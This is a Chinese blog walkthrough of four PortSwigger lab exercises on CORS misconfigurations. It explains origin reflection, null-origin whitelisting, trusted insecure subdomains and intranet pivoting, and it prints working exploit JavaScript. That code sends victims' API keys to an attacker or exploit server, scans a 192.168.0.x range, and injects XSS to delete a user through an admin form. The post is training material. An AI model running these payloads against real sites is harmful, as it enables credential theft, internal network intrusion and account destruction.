# 原创
：  【burpsuite安全练兵场-客户端13】跨来源资源共享（CORS）-4个实验（全）

# 【burpsuite安全练兵场-客户端13】跨来源资源共享（CORS）-4个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书，华为云、阿里云、51CTO优质博主等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）跨源资源共享（CORS）（√）
（2）服务器生成ACAO头从客户端指定的原始标头、解析原始标头时出错（√）
（3）白名单中的空原点值、通过 CORS信任关系利用XSS（√）
（4）使用配置不当的CORS中断TLS（√）
（5）没有凭据的内部网和CORS（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、跨源资源共享（CORS）](#%E4%B8%80%E3%80%81%E8%B7%A8%E6%BA%90%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%88CORS%EF%BC%89)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、同源政策](#2%E3%80%81%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96)

[3、放宽同源政策](#3%E3%80%81%E6%94%BE%E5%AE%BD%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96)

[二、CORS配置问题导致的漏洞](#%E4%BA%8C%E3%80%81CORS%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E)

[1、服务器生成ACAO头从客户端指定的原始标头](#1%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%9F%E6%88%90ACAO%E5%A4%B4%E4%BB%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8C%87%E5%AE%9A%E7%9A%84%E5%8E%9F%E5%A7%8B%E6%A0%87%E5%A4%B4)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E5%85%B7%E6%9C%89%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%82%B9%E5%8F%8D%E5%B0%84%E7%9A%84CORS%E8%84%86%E5%BC%B1%E6%80%A7)[实验1：具有基本原点反射的CORS脆弱性](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E5%85%B7%E6%9C%89%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%82%B9%E5%8F%8D%E5%B0%84%E7%9A%84CORS%E8%84%86%E5%BC%B1%E6%80%A7)

[ 2、解析原始标头时出错](#%C2%A02%E3%80%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E5%A7%8B%E6%A0%87%E5%A4%B4%E6%97%B6%E5%87%BA%E9%94%99)

[ 3、白名单中的空原点值](#%C2%A03%E3%80%81%E7%99%BD%E5%90%8D%E5%8D%95%E4%B8%AD%E7%9A%84%E7%A9%BA%E5%8E%9F%E7%82%B9%E5%80%BC)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%85%B7%E6%9C%89%E5%8F%AF%E4%BF%A1%E7%A9%BA%E6%BA%90%E7%9A%84CORS%E6%BC%8F%E6%B4%9E)[实验2：具有可信空源的CORS漏洞](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%85%B7%E6%9C%89%E5%8F%AF%E4%BF%A1%E7%A9%BA%E6%BA%90%E7%9A%84CORS%E6%BC%8F%E6%B4%9E)

[4、通过 CORS信任关系利用XSS](#4%E3%80%81%E9%80%9A%E8%BF%87%20CORS%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E5%88%A9%E7%94%A8XSS)

[5、使用配置不当的CORS中断TLS](#5%E3%80%81%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84CORS%E4%B8%AD%E6%96%ADTLS)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%9A%84CORS%E6%BC%8F%E6%B4%9E)[实验3：受信任的不安全协议的CORS漏洞](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%9A%84CORS%E6%BC%8F%E6%B4%9E)

[ 6、没有凭据的内部网和CORS](#%C2%A06%E3%80%81%E6%B2%A1%E6%9C%89%E5%87%AD%E6%8D%AE%E7%9A%84%E5%86%85%E9%83%A8%E7%BD%91%E5%92%8CCORS)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9ACORS%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E6%9E%A2%E8%BD%B4%E6%94%BB%E5%87%BB)[实验4：CORS漏洞与内部网络枢轴攻击](#%E5%AE%9E%E9%AA%8C4%EF%BC%9ACORS%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E6%9E%A2%E8%BD%B4%E6%94%BB%E5%87%BB)

---


## 一、跨源资源共享（CORS）

> 
<h3>1、简述：</h3>
跨源资源共享（CORS）是一种浏览器机制，它允许对位于给定域之外的资源进行受控访问。它扩展并增加了同源策略的灵活性（ 标准操作规程）.但如果网站的CORS策略配置和实施不当，也可能会导致跨域攻击。CORS无法抵御跨源攻击，如跨站点请求伪造 （CSRF）


> 
<h3>2、同源政策</h3>
同源策略是一种限制性的跨源规范，它限制网站与源域之外的资源交互的能力。同源策略以应对潜在的恶意跨域交互，如一个网站窃取另一个网站的私人数据。它通常允许一个域向其他域发出请求，但不允许访问响应。 


> 
<h3>3、放宽同源政策</h3>
1、同源政策的限制性很强，因此设计了各种方法来规避这些限制。许多网站与子域或第三方网站的交互方式需要完全跨源访问。使用跨来源资源共享（CORS）可以有控制地放宽同源政策。
<hr/>
2、跨源资源共享协议使用一组HTTP头，这些头定义了受信任的Web源和相关属性，例如是否允许经过身份验证的访问。这些信息在浏览器和它试图访问的跨源网站之间的头交换中组合。 


---


---


## 二、CORS配置问题导致的漏洞

> 
<h3>1、服务器生成ACAO头从客户端指定的原始标头</h3>
1、一些应用程序需要提供对许多其他域的访问。维护允许的域列表需要不断的努力，任何错误都有可能破坏功能。因此，一些应用程序采取了有效地允许来自任何其他域的访问的简单途径。
<hr/>
2、一种方法是从请求中阅读Origin头，并包含一个响应头，声明请求源是允许的
<pre><code>。例如，考虑接收以下请求的应用程序：
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

响应如下：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...

这些报头声明允许从请求域（malicious-website.com）进行访问，并且跨源请求可以包括Cookie（Access-Control-Allow-Credentials：true），因此将在会话中处理。</code></pre>
<br/>  
<hr/>
3、由于应用程序在Access-Control-Allow-Origin标头中反映任意来源，这意味着任何域都可以访问易受攻击域中的资源。如果响应包含任何敏感信息（如API密钥或CSRF令牌），可以通过在网站上放置以下脚本来检索此信息：
<pre><code>var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};</code></pre>
<hr/>
4、涉及实验：<br/> 实验1：具有基本原点反射的CORS脆弱性


---


> 
<h3>实验1：具有基本原点反射的CORS脆弱性</h3>
信息：
1、此网站具有不安全的CORS配置，因为它信任所有来源。
2、解决实验：编制一些JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交管理员的API密钥
3、已有账号：wiener:peter
<hr/>
part1:
登陆账号，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS


将请求发送到Burp Repeater，并使用添加的标题重新提交：
<pre>`Origin: https://example.com`</pre>
观察到原点反映在Access-Control-Allow-Origin标头中



<hr/>
part2:
利用漏洞
在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为您的唯一实验室URL）
<pre><code>&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
&lt;/script&gt;

我的是：
&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0aed006704c97c69c0aca55c009300fc.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
&lt;/script&gt;</code></pre>


单击查看漏洞利用。观察漏洞利用是否有效-您已登录到日志页面，并且您的API密钥位于URL中（点击view即可自测poc，此处不展示了）<br/> 返回到利用漏洞攻击服务器，然后单击Deliver exploit to victium（将利用漏洞攻击发送给受害者）


单击“Access log（访问日志）”

 检索并提交受害者的API密钥提交
<pre><code>%20%224G8BvfHagAHOQk1BS1YetCZzQQu2zK2L%22

4G8BvfHagAHOQk1BS1YetCZzQQu2zK2L
（引号我去掉了）</code></pre>
并进行URL解码




 <img alt="" height="940" src="https://img-blog.csdnimg.cn/347b0fc04efc47f788ddf7d735470598.png" width="1200"/>
完成实验



---


> 
<h3> 2、解析原始标头时出错</h3>
1、一些支持从多个来源访问的应用程序通过使用允许来源的白名单来实现这一点。当接收到CORS请求时，将提供的来源与白名单进行比较。如果来源出现在白名单上，则它将反映在Access-Control-Allow-Origin报头中，以便授予访问权限。
<pre><code>如应用程序接收正常请求，如：
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com

应用产品将对照其允许的来源列表检查提供的来源，如果来源在列表中，则按如下方式反映来源：
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com</code></pre>
<hr/>
2、实施CORS原点白名单时经常会出现错误。一些组织决定允许从其所有子域（包括未来尚不存在的子域）进行访问。并且一些应用程序允许从各种其他组织的域（包括它们的子域）进行访问。这些规则通常通过匹配URL前缀或后缀，或使用正则表达式来实现。实现中的任何错误都可能导致访问权限被授予非预期的外部域。
<pre><code>1、假设某个应用程序赠款对以下列字符结尾的所有域的访问权限：
normal-website.com

攻击者可能能够通过注册以下域获得访问权限：
hackersnormal-website.com

2、假设应用程序赠款对以开头的所有域的访问权限
normal-website.com

攻击者可能能够使用以下域获得访问权限：
normal-website.com.evil-user.net</code></pre>


> 
<h3> 3、白名单中的空原点值</h3>
1、原始标头的规范支持值null。
<pre><code>浏览器可能会发送该值null在各种异常情况下的原始标题中：
    跨源重定向。
    来自序列化数据的请求。
    使用 file:协议请求。
    沙盒跨来源请求。</code></pre>
某些应用程序可能会将null支持应用程序的本地开发。
<pre><code>例如，假设应用程序接收到以下跨来源请求：
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null

并且服务器响应如下：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true</code></pre>
在这种情况下，攻击者可以使用各种技巧生成包含该值的跨源请求null在原始标题中。这将满足白名单，从而实现跨域访问。
<pre><code>例如，这可以使用沙箱来完成 内嵌框架跨来源申请表格：
&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
&lt;/script&gt;"&gt;&lt;/iframe&gt;
</code></pre>
<hr/>
2、涉及实验：
实验2：具有可信空源的CORS漏洞


> 
<h3>实验2：具有可信空源的CORS漏洞</h3>
信息：
1、此网站具有不安全的CORS配置，因为它信任"空"源。
2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api Key
3、已有账号：wiener:peter
<hr/>
part1:
登陆账号，单击"我的帐户"，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS



将请求发送到Burp Repeater，并使用添加的标题重新提交
<pre>`Origin: null`</pre>
<br/> 观察null来源是否反映在Access-Control-Allow-Origin标题中


<hr/>
part2:
漏洞利用
在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为实验室URL的URL，将YOUR-EXPLOIT-SERVER-ID替换为漏洞利用服务器ID）
<pre><code>&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
&lt;/script&gt;"&gt;&lt;/iframe&gt;

我的是：
&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0aba007e04d40bebc0cc042b007400f9.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a2b00ef049c0b89c073031b01250021.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
注意iframe沙箱的使用，因为这会生成一个空的源请求。<br/> 单击"查看漏洞利用"（view）。观察漏洞利用是否有效-已登录到日志页面，API密钥位于URL中（测试poc的可行性，就不在这测了，直接到发给受害者）<br/> 返回到利用漏洞攻击服务器并单击"将利用漏洞攻击发送给受害者"。


单击"Access log"（访问日志）

解码
<pre><code>apikey%22%3A%20%226dvJDKFcqnMMWuOfBs2NzzZGoz1YPeVQ%22%2C%0A%20%20%22
apikey": "6dvJDKFcqnMMWuOfBs2NzzZGoz1YPeVQ"</code></pre>



检索提交api Key完成实验
<pre>`6dvJDKFcqnMMWuOfBs2NzzZGoz1YPeVQ`</pre>




---


> 
<h3>4、通过 CORS信任关系利用XSS</h3>
1、即使"正确"配置的CORS也会在两个源之间建立信任关系。如果网站信任易受跨站点脚本攻击的源（ XSS语言），则攻击者可以利用XSS注入一些JavaScript，该JavaScript使用CORS从信任易受攻击应用程序的站点检索敏感信息。
<pre><code>如以下请求：
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...

如果服务器响应为：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

然后，在www.example.com上发现XSS漏洞的攻击者subdomain.vulnerable-website.com可以使用如下URL检索API密钥：
https://subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;
</code></pre>



> 
<h3>5、使用配置不当的CORS中断TLS</h3>
1、假设严格使用HTTPS的应用程序也将使用纯HTTP的受信任子域列入白名单。
<pre><code>例如，当应用程序接收到以下请求时：
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...

应用程序响应如下：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true</code></pre>
在这种情况下，能够拦截受害用户通信量的攻击者可以利用CORS配置危害受害用户与应用程序的交互。
<pre><code>此攻击涉及以下步骤：
1、受害者用户发出任何普通HTTP请求。
2、攻击者注入重定向到：
    http://trusted-subdomain.vulnerable-website.com
    受害者的浏览器会跟随重定向。
3、攻击者拦截普通HTTP请求，并将包含CORS请求的欺骗响应返回到：
    https://vulnerable-website.com
4、受害者的浏览器发出CORS请求，包括来源：
    http://trusted-subdomain.vulnerable-website.com
    应用程序允许该请求，因为这是 白名单 起源。请求的敏感数据在响应中返回。
    攻击者的欺骗页面可以读取敏感数据，并将其传输到攻击者控制下的任何域。</code></pre>
即使易受攻击的网站在使用HTTPS方面非常健壮，没有HTTP端点并且所有Cookie都标记为安全，此攻击也会有效。 
<hr/>
2、涉及实验：
实验3：受信任的不安全协议的CORS漏洞


> 
<h3>实验3：受信任的不安全协议的CORS漏洞</h3>
信息：
1、此网站具有不安全的CORS配置，因为它信任所有子域，而不管协议如何。
2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api key
3、已有账号：wiener:peter
<hr/>
part1:
登陆账号，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS。


将请求发送到Burp Repeater，并使用添加的标题Origin重新提交：` `
<pre><code>Origin:http://subdomain.lab-id
（lab-id 是实验室域名）

我的是：
Origin:http://subdomain.0a4700a903395d98c0e42285006b0014.web-security-academy.net</code></pre>
<br/> 观察来源是否反映在Access-Control-Allow-Origin标头中，确认CORS配置是否允许从任意子域（HTTPS和HTTP）进行访问

<hr/>
part2:
组合利用<br/> 打开一个产品页面，单击Check stock并观察它是使用一个子域上的HTTP URL加载的
<img alt="" height="1021" src="https://img-blog.csdnimg.cn/9241a7839cde46b397738cf22ebe6069.png" width="1200"/><br/> 注意到productID参数易受XSS攻击
 <img alt="" height="992" src="https://img-blog.csdnimg.cn/e827db6a641348ab9a448df6d0cfe9aa.png" width="1200"/>


在浏览器中，转到漏洞利用服务器并输入以下HTML，将YOUR-LAB-ID替换为您的唯一实验室URL，将YOUR-EXPLOIT-SERVER-ID替换为您的漏洞利用服务器ID：
<pre><code>&lt;script&gt;
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1"
&lt;/script&gt;

我的是：
&lt;script&gt;
    document.location="http://stock.0a4700a903395d98c0e42285006b0014.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a4700a903395d98c0e42285006b0014.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0aef008603225dd5c0fe210801970018.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1"
&lt;/script&gt;</code></pre>


单击查看漏洞利用。观察漏洞利用是否有效（view），已登录到日志页面，API密钥位于URL中<br/> 返回到利用漏洞攻击服务器，然后单击Deliver exploit to victium（将利用漏洞攻击发送给受害者）
<img alt="" height="953" src="https://img-blog.csdnimg.cn/d1a48797138d4ac085b1319b2680be07.png" width="1200"/><br/> 单击“Access log（访问日志）”
 <img alt="" height="965" src="https://img-blog.csdnimg.cn/fedbd31687ec4c8ab8b6731bec71dbfa.png" width="1200"/>


检索api key
<pre>`apikey%22:%20%22LPfbAvOVfaP3D2Wx04Zp18UOWFRuilcz%22`</pre>

进行解码
<pre>`apikey": "LPfbAvOVfaP3D2Wx04Zp18UOWFRuilcz"`</pre>

 提交，完成实验
<pre>`LPfbAvOVfaP3D2Wx04Zp18UOWFRuilcz`</pre>




---


> 
<h3> 6、没有凭据的内部网和CORS</h3>
1、大多数CORS攻击依赖于响应报头的存在：
<pre>`Access-Control-Allow-Credentials: true`</pre>
如果没有该标头，受害用户的浏览器将拒绝发送他们的cookie，这意味着攻击者只能访问未经身份验证的内容，他们可以通过直接浏览目标网站轻松访问这些内容。
<hr/>
2、但有一种常见的情况是攻击者无法直接访问网站：当它是组织内部网的一部分，并且位于私有IP地址空间中时。内部网站的安全标准通常低于外部网站，这使得攻击者能够找到漏洞并获得进一步的访问权限。
<pre><code>例如，专用网络内的跨来源请求可以如下：
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com

并且服务器响应如下：
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *</code></pre>
<hr/>
3、应用程序服务器信任来自任何来源的资源请求，而无需凭据。如果私有IP地址空间内的用户访问公共Internet，则可以从外部站点执行基于CORS的攻击，该外部站点使用受害者的浏览器作为访问内部网资源的代理。
<hr/>
4、涉及实验：
实验4：CORS漏洞与内部网络枢轴攻击



---


> 
<h3>实验4：CORS漏洞与内部网络枢轴攻击</h3>
信息：
1、此网站具有不安全的CORS配置，因为它信任所有内部网络来源。
2、完成实验：编制JavaScript来定位本地网络（192.168.0.0/24，端口8080）上的端点，然后使用该端点来识别和创建基于CORS的攻击以删除用户。删除用户carlos
<hr/>
part1:
需要扫描本地网络以查找端点。将$collaboratorPayload替换为Collaborator有效负载或漏洞利用服务器URL
<pre><code>我的漏洞利用服务器
http://exploit-0a000082039e8219c2f833a701b700cb.exploit-server.net/</code></pre>

<pre><code>&lt;script&gt;
var q = [], collaboratorURL = 'http://$collaboratorPayload';

for(i=1;i&lt;=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i&lt;=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r =&gt; r.text().then(text =&gt; {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&amp;code='+encodeURIComponent(text)+'&amp;'+Date.now();
	}))
	.catch(e =&gt; {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x =&gt; {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
&lt;/script&gt;</code></pre>
在漏洞利用服务器中输入以下代码。单击存储，然后单击“将漏洞利用发送给受害者”。

 检查日志或Collaborator交互组件，并查看发送给它的代码参数

<pre>`192.168.0.175:8080`</pre>
<hr/>
part2:
重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为从协作者交互中检索到的IP地址和端口号。不要忘记添加Collaborator有效负载或再次利用服务器URL。更新并提供漏洞利用。
<pre><code>&lt;script&gt;
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r =&gt; r.text().then(text =&gt; {
		xss(url, text, '"&gt;&lt;img src='+collaboratorURL+'?foundXSS=1&gt;');
	}))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
&lt;/script&gt;</code></pre>
 现在我们将探测用户名字段中的XSS漏洞。

 检索URL中具有foundXSS=1的Collaborator交互；或者在日志中看到foundXSS=1

<hr/>
part3:
重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为与步骤2中相同的IP地址和端口号，再次添加Collaborator有效负载或漏洞利用服务器。更新并提供漏洞利用
<pre><code>&lt;script&gt;
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=&gt;r.text().then(text=&gt;
	{
		xss(url, text, '"&gt;&lt;iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)"&gt;');
	}
	))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
&lt;/script&gt;</code></pre>

Collaborator交互或利用服务器日志会提供管理页面的源代码



<hr/>
part4：
检索源代码，会注意到有一个允许删除用户的表单。重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为相同的IP地址和端口号。
<pre><code>&lt;script&gt;
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
	fetch(url).then(r=&gt;r.text().then(text=&gt;
	{
	xss(url, text, '"&gt;&lt;iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()"&gt;');
	}
	))
}

fetchUrl("http://$ip");
&lt;/script&gt;</code></pre>

 代码通过注入一个指向/admin页面的iframe提交表单以删除carlos




---


---

